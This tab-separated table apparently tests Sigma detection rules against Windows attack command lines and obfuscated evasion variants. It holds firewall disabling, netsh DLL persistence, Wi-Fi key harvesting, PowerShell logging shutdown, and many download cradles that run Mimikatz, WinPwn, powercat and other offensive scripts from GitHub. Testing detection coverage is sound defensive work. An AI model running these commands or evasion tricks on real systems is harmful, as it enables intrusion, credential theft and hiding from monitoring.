Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1562.004	proc_creation_win_netsh_fw_allow_rdp	RDP Connection Allowed Via Netsh.EXE	01aeb693-138d-49d2-9403-c4f52d7d3d62		"netsh.exe advf""irewall"" fire""wall"" add rule name=""Allow RDP"" dir=in action=allow protocol=6 localport=3389"	FALSE	FALSE	FALSE	
t1562.004	proc_creation_win_netsh_fw_delete_rule	Firewall Rule Deleted Via Netsh.EXE	1a5fefe6-734f-452e-a07d-fc1c35bce4b2		"netsh advfirewall firewall del rule name=""Allow Port 80"""	FALSE	FALSE	FALSE	
t1562.004	proc_creation_win_netsh_fw_delete_rule	Firewall Rule Deleted Via Netsh.EXE	1a5fefe6-734f-452e-a07d-fc1c35bce4b2		"netsh.exe advfirewall firewall delete	rule name=""All"""	FALSE	FALSE	FALSE	
t1562.004	proc_creation_win_netsh_fw_disable	Firewall Disabled via Netsh.EXE	57c4bf16-227f-4394-8ec7-1b745ee061c3		netsh advfirewall set allprofiles state o^f^f	FALSE	FALSE	FALSE	
t1562.004	proc_creation_win_netsh_fw_enable_group_rule	Netsh Allow Group Policy on Microsoft Defender Firewall	347906f3-e207-4d18-ae5b-a9403d6bcdef		"copy netsh.exe not_netsh.exe && not_netsh.exe advfirewall firewall set rule group=""File and Printer Sharing"" new enable=Yes"	FALSE	FALSE	FALSE	
t1562.004	proc_creation_win_netsh_fw_enable_group_rule	Netsh Allow Group Policy on Microsoft Defender Firewall	347906f3-e207-4d18-ae5b-a9403d6bcdef		"netsh advfirewall firewall set rule name=""Remote Desktop"" new enable=Yes"	FALSE	FALSE	FALSE	
t1562.004	proc_creation_win_netsh_fw_enable_group_rule	Netsh Allow Group Policy on Microsoft Defender Firewall	347906f3-e207-4d18-ae5b-a9403d6bcdef		"netsh.exe advfirewall firewall set rule group=""@FirewallAPI.dll,-28752"" new enable=Yes"	FALSE	FALSE	FALSE	
t1016	proc_creation_win_netsh_fw_rules_discovery	Firewall Configuration Discovery Via Netsh.EXE	0e4164da-94bc-450d-a7be-a4b176179f1f		netsh  advfirewall firewall show rule name=all	FALSE	FALSE	FALSE	
t1016	proc_creation_win_nltest_recon	Potential Recon Activity Via Nltest.EXE	5cc90652-4cbd-4241-aa3b-4b462fa5a248		nltest  /domain_trusts	FALSE	FALSE	FALSE	
t1016	proc_creation_win_nltest_recon	Potential Recon Activity Via Nltest.EXE	5cc90652-4cbd-4241-aa3b-4b462fa5a248		nltest.exe  /dclist:%%userdnsdomain%%	FALSE	FALSE	FALSE	
t1016	proc_creation_win_nltest_recon	Potential Recon Activity Via Nltest.EXE	5cc90652-4cbd-4241-aa3b-4b462fa5a248		nltest  /trusted_domains	FALSE	FALSE	FALSE	
t1016	proc_creation_win_nltest_recon	Potential Recon Activity Via Nltest.EXE	5cc90652-4cbd-4241-aa3b-4b462fa5a248		"nltest /dcl""i""st:contoso.local"	FALSE	FALSE	FALSE	
t1016	proc_creation_win_nltest_recon	Potential Recon Activity Via Nltest.EXE	5cc90652-4cbd-4241-aa3b-4b462fa5a248		"nltest /domain""_""trusts"	FALSE	FALSE	FALSE	
t1016	proc_creation_win_susp_network_command	Suspicious Network Command	a29c1813-ab1f-4dde-b489-330b952e91ae		"""cmd.exe"" /c ipconfig /all & net config workstation & net view /all /domain & nltest /domain_trusts"	FALSE	FALSE	FALSE	
t1016	proc_creation_win_susp_network_command	Suspicious Network Command	a29c1813-ab1f-4dde-b489-330b952e91ae		"""cmd.exe"" /c ipconfig /all & netsh interface show interface & arp -a & nbtstat -n & net config"	FALSE	FALSE	FALSE	
t1016	proc_creation_win_susp_network_command	Suspicious Network Command	a29c1813-ab1f-4dde-b489-330b952e91ae		"""cmd.exe"" /c arp -a"	FALSE	FALSE	FALSE	
t1546.007	proc_creation_win_netsh_helper_dll_persistence	Potential Persistence Via Netsh Helper DLL	56321594-9087-49d9-bf10-524fe8479452		"netsh.exe  add helper ""C:\AtomicRedTeam\atomics\T1546.007\bin\NetshHelper.dll"""	FALSE	FALSE	FALSE	
t1546.007	proc_creation_win_netsh_helper_dll_persistence	Potential Persistence Via Netsh Helper DLL	56321594-9087-49d9-bf10-524fe8479452		copy netsh.exe not_netsh.exe && not_netsh.exe add helper evil.dll	FALSE	FALSE	FALSE	
t1546.007	proc_creation_win_netsh_helper_dll_persistence	Potential Persistence Via Netsh Helper DLL	56321594-9087-49d9-bf10-524fe8479452		"netsh add	helper evil.dll"	FALSE	FALSE	FALSE	
t1546.007	proc_creation_win_netsh_helper_dll_persistence	Potential Persistence Via Netsh Helper DLL	56321594-9087-49d9-bf10-524fe8479452		"netsh.exe ""a""""d""""d"" ""h""""e""""l""""p""""e""""r"" evil.dll"	FALSE	FALSE	FALSE	
t1040	proc_creation_win_netsh_packet_capture	New Network Trace Capture Started Via Netsh.EXE	d3c3861d-c504-4c77-ba55-224ba82d0118		netsh  trace start capture=yes tracefile=C:\Users\thaim\AppData\Local\Temp\trace.etl maxsize=10	FALSE	FALSE	FALSE	
t1040	proc_creation_win_netsh_packet_capture	New Network Trace Capture Started Via Netsh.EXE	d3c3861d-c504-4c77-ba55-224ba82d0118		netsh tr st capture=yes	FALSE	FALSE	FALSE	
t1040	proc_creation_win_netsh_wifi_credential_harvesting	Harvesting Of Wifi Credentials Via Netsh.EXE	42b1a5b8-353f-4f10-b256-39de4467faff		"cmd.exe /c ""echo wlan show profile name=SSID key=clear | netsh.exe"""	FALSE	FALSE	FALSE	
t1083	proc_creation_win_notepad_local_passwd_discovery	Notepad Password Files Discovery	3b4e950b-a3ea-44d3-877e-432071990709		cmd.exe /c notepad.exe C:\Users\admin\Documents\passwords.txt	FALSE	FALSE	FALSE	
t1083	proc_creation_win_notepad_local_passwd_discovery	Notepad Password Files Discovery	3b4e950b-a3ea-44d3-877e-432071990709		"notepad.exe ""C:\Data\passwords.csv"""	FALSE	FALSE	FALSE	
t1083	proc_creation_win_notepad_local_passwd_discovery	Notepad Password Files Discovery	3b4e950b-a3ea-44d3-877e-432071990709		notepad.exe C:\secure\passwords.bak	FALSE	FALSE	FALSE	
t1083	proc_creation_win_notepad_local_passwd_discovery	Notepad Password Files Discovery	3b4e950b-a3ea-44d3-877e-432071990709		"powershell.exe -Command ""notepad C:\backup\passwords.log"""	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_nslookup_poweshell_download	Nslookup PowerShell Download Cradle - ProcessCreation	1b3b01c7-84e9-4072-86e5-fc285a41ff23		"""C:\WINDOWS\system32\nslookup.exe"" -q=txt example.com 8.8.8.8"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') samfile -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') bluekeep -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') fruit -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') MS17-10 -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') spoolvulnscan -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""cmd.exe"" /c Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"""	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""cmd.exe"" /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"""	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {# Encoded payload in next command is the following \""""Set-Content -path \""""$env:SystemRoot/Temp/art-marker.txt\"""" -value \""""Hello from the Atomic Red Team\""""\"""" reg.exe add \""""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam\"""" /v ART /t REG_SZ /d \""""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"""" /f iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {write-host \""""Remote download of SharpHound.ps1 into memory, followed by execution of the script\"""" -ForegroundColor Cyan IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp Start-Sleep 5}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"Powershell.exe  ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"""	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"powershell.exe  ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"""	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1') Invoke-Seatbelt -Command \""""-group=all\""""}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1') Invoke-SharpUp -command \""""audit\""""}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1') Invoke-watson}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Generalrecon -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') itm4nprivesc -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Morerecon -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') oldchecks -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') otherchecks -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') RBCD-Check -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') winPEAS -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') generaldomaininfo -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c 127.0.0.1 -p 80}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') Invoke-PowerShellIcmp -IPAddress 127.0.0.1}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""cmd.exe"" /c reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f & reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f & reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f & reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f & reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		reg   add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		reg   add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		reg   add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		reg   add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {reg add \""""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI\"""" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f reg delete \""""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI\"""" /v DisableAIDataAnalysis /f}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') printercheck -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') shareenumeration -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1') Invoke-Internalmonologue -command \""""-Downgrade true -impersonate true -restore true\""""}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') dotnet -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Dotnetsearch -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
